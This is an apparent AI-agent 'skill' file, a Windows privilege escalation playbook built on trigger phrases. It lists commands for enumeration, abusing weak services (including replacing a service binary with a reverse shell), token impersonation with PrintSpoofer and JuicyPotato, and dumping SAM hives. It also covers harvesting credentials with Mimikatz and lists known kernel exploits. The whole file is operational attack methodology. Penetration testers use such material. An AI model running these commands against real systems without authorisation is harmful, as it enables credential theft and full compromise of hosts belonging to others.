# SKILL: Privilege Escalation - Windows

## Description
Windows privilege escalation methodology from low-priv shell to SYSTEM/Administrator.

## Trigger Phrases
windows privesc, winpeas, potato, service exploit, dll hijack, token, seimpersonate

## Methodology

### Phase 1: Enumeration
1. Run WinPEAS: `.\winPEASany.exe`
2. System info: `systeminfo`, `whoami /all`, `whoami /priv`
3. Installed software: `wmic product get name,version`
4. Scheduled tasks: `schtasks /query /fo LIST /v`
5. Running services: `wmic service get name,displayname,pathname,startmode`

### Phase 2: Service Exploitation
1. Unquoted service path: `wmic service get name,pathname | findstr /i "Program Files"`
2. Weak service permissions: `accesschk.exe -uwcqv "Authenticated Users" * /accepteula`
3. Modifiable service binary: replace with reverse shell
4. DLL hijacking: check DLL search order for writable paths

### Phase 3: Token Abuse
1. **SeImpersonatePrivilege**: `PrintSpoofer.exe -i -c cmd`, `JuicyPotato.exe`
2. **SeBackupPrivilege**: Copy SAM/SYSTEM hives
3. **SeTakeOwnershipPrivilege**: Take ownership of sensitive files
4. **SeDebugPrivilege**: Inject into SYSTEM process

### Phase 4: Credential Harvesting
1. SAM dump: `reg save HKLM\SAM sam.bak && reg save HKLM\SYSTEM sys.bak`
2. Mimikatz: `sekurlsa::logonpasswords`, `lsadump::sam`
3. DPAPI: `sekurlsa::dpapi`
4. Credential Manager: `cmdkey /list`
5. Browser passwords, WiFi passwords, cached credentials

### Phase 5: Kernel Exploits
1. Check Windows version/build against known exploits
2. MS16-032, MS17-010, PrintNightmare, HiveNightmare
3. Search: `systeminfo | findstr /B /C:"OS Name" /C:"OS Version"`
